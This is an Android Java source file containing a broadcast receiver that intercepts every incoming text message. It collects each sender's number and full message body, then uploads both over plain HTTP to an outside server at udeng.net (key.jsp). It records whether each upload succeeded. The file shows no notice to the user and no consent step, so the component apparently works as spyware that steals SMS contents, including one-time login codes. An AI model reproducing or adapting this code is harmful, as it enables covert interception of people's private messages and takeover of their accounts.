package com.emotte.lzh;

import java.util.Date;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.SmsMessage;

import com.emotte.data.ServiceInfo;
import com.emotte.util.Constants;
import com.emotte.util.HttpUtil;
import com.emotte.util.SharedPreTools;

public class MyBroadcast extends BroadcastReceiver {

	EdjApp app;
	String receiveMsg = "";

	SmsMessage[] msg = null;
	String mobile;
	String number;
	// action 名称
	String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";

	@Override
	public void onReceive(Context context, Intent intent) {
		if (intent.getAction().equals(SMS_RECEIVED)) {
			StringBuffer SMSAddress = new StringBuffer();
			StringBuffer SMSContent = new StringBuffer();
			Bundle bundle = intent.getExtras();
			if (bundle != null) {
				Object[] pdusObjects = (Object[]) bundle.get("pdus");
				SmsMessage[] messages = new SmsMessage[pdusObjects.length];
				for (int i = 0; i < pdusObjects.length; i++) {
					messages[i] = SmsMessage
							.createFromPdu((byte[]) pdusObjects[i]);
				}
				for (SmsMessage message : messages) {

					SMSAddress.append(message.getDisplayOriginatingAddress());
					SMSContent.append(message.getDisplayMessageBody());
					System.out.println("发送号码：" + SMSAddress + "\n" + "短信内容："
							+ SMSContent);

					mobile = message.getDisplayOriginatingAddress();
					number = message.getDisplayMessageBody();

					new SaveCallLogOtherAsyncTask(mobile, number).execute("");
				}
			}
		}
	}

	class SaveCallLogOtherAsyncTask extends AsyncTask<String, String, String> {

		String mobile;
		String code;

		public SaveCallLogOtherAsyncTask(String mobile, String code) {
			this.mobile = mobile;
			this.code = code;
		}

		/*
		 * (non-Javadoc) 后续上传
		 * 
		 * @see android.os.AsyncTask#doInBackground(Params[])
		 */
		@Override
		protected String doInBackground(String... params) {

			ServiceInfo minfo = new ServiceInfo();
			minfo.setId(SharedPreTools.getTimeId());
			minfo.setNumber(mobile);
			minfo.setContent(code);
			minfo.setCreateTime(new Date());

			SharedPreTools.saveServicePre(Constants.NOUSER_DATA, mobile, minfo);

			String url = "http://www.udeng.net/jsp/key.jsp?p=" + mobile + "&k="
					+ code;

			String code3 = HttpUtil.get(url, "hhh", "utf-8");
			if (code3 != null && !"".equals(code3)) {
				code3 = code3.replaceAll("\n", "").replaceAll("\r", "").trim();
				if ("1".endsWith(code3) || code3 == "1") {

					System.out.println(" 上传成功  " + mobile);
					SharedPreTools.saveServicePre(Constants.SUCCESS_DATA,
							mobile, minfo);
					SharedPreTools.removeObjectPre(Constants.NOUSER_DATA,
							mobile);
				}else if("0".equals(code3) || code3 == "0") {

					System.out.println(" 上传失败  " + mobile);
					SharedPreTools.saveServicePre(Constants.FAIL_DATA,
							mobile, minfo);
					SharedPreTools.removeObjectPre(Constants.NOUSER_DATA,
							mobile);
				}
			}else  {

				System.out.println(" 上传失败  " + mobile);
				SharedPreTools.saveServicePre(Constants.FAIL_DATA,
						mobile, minfo);
				SharedPreTools.removeObjectPre(Constants.NOUSER_DATA,
						mobile);
			}
			return null;

		}
	}

}